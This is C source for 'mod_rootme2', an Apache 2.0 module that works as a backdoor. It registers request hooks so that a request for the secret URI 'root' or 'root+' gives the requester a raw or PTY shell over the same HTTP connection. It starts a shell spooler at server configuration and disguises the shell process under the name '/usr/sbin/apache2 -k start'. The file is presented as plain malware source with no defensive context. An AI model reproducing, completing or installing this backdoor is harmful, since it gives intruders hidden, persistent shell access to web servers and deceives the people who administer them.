/*
 *  mod_rootme2 for Apache 2.0, version 0.3
 *
 *  Copyright (C) 2004  Christophe Devine
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#define HIDE_SHELL      "/usr/sbin/apache2 -k start"
#define ROOT_KEY        "root"
#define ROOT_KEY2       "root+"

#include "mrm_server.h"
#include "httpd20.h"

static int rootme2_post_config( apr_pool_t *pconf, apr_pool_t *plog,
                                apr_pool_t *ptemp, server_rec *s )
{
    shell_spooler();

    return( OK );
}

static int rootme2_post_read_request( request_rec *r )
{
    int fd;
    apr_socket_t *client_socket;

    client_socket = ap_get_module_config(
        r->connection->conn_config, &core_module);

    if( client_socket )
        fd = client_socket->socketdes;

    if (r->uri && !strcmp(r->uri, ROOT_KEY))
    {
        process_client( GET_RAW_SHELL, fd );
        exit( 0 );
    }

    if (r->uri && !strcmp(r->uri, ROOT_KEY2))
    {
        process_client( GET_PTY_SHELL, fd );
        exit( 0 );
    }

    return( DECLINED );
}

static void rootme2_register_hooks( apr_pool_t *p )
{
    ap_hook_post_config( (void *) rootme2_post_config,
                         NULL, NULL, APR_HOOK_FIRST );

    ap_hook_post_read_request( (void *) rootme2_post_read_request,
                               NULL, NULL, APR_HOOK_FIRST );
}

module rootme2_module =
{
    STANDARD20_MODULE_STUFF,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    rootme2_register_hooks
};
